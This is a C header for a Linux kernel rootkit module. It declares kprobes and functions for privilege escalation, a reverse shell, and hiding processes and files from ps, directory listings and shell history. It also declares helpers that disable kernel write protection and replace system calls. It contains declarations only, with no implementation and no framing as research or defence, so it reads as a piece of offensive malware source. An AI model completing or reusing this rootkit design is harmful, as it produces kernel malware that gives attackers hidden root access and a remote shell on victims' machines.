#ifndef ROOTKIT_H
#define ROOTKIT_H

#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/cred.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/string.h>
#include <linux/sched.h>
#include <linux/list.h>
#include <linux/slab.h>
#include <linux/file.h>
#include <linux/fdtable.h>
#include <linux/interrupt.h>
#include <linux/workqueue.h>
#include <linux/atomic.h>
#include <linux/rcupdate.h>
#include <linux/dcache.h>
#include <linux/sched/signal.h>
#include <linux/syscalls.h>
#include <linux/ptrace.h>

#define PF_INVISIBLE 0x10000000  // Custom flag for process invisibility

// ===================== Global Variables =====================
extern int target_fd_01;
extern int target_fd_02;

// File Hiding Declarations
extern const char *hidden_file_01;
extern const char *hidden_file_02;

// Kprobe Declarations
extern struct kprobe kp_getuid_privesc;
extern struct kprobe kp_getuid_revshell;
extern struct kprobe kp_filldir64;
extern struct kprobe kp_history_hook;
extern struct kprobe kp_proc_readdir;

// Flags for controlling escalation/reverse shell logic
extern int privesc_done;
extern atomic_t reverse_shell_done;

// Task Hiding Reference
extern struct task_struct *hidden_task;


// ===================== Function Prototypes =====================

// Privilege Escalation
int init_privesc(void);
void cleanup_privesc(void);

// Reverse Shell
int init_revshell(void);
void cleanup_revshell(void);

// Process Hiding (ps_hide.c)
int init_process_hiding(void);
void cleanup_process_hiding(void);

// Process Auxiliary Hiding (psaux.c)
int init_psaux_hiding(void);
void cleanup_psaux_hiding(void);

// History Hook
int init_history_hook(void);
void cleanup_history_hook(void);

// File Management
int create_and_write_file(const char *path, const char *content);
int init_file_creation(void);
void cleanup_file_creation(void);

// Process Hiding Utility
void hide_process_by_name(const char *proc_name);

// Kernel Utilities
void disable_write_protection(void);
void enable_write_protection(void);
void set_syscall(const char *name, void *new_func);

#endif  // ROOTKIT_H
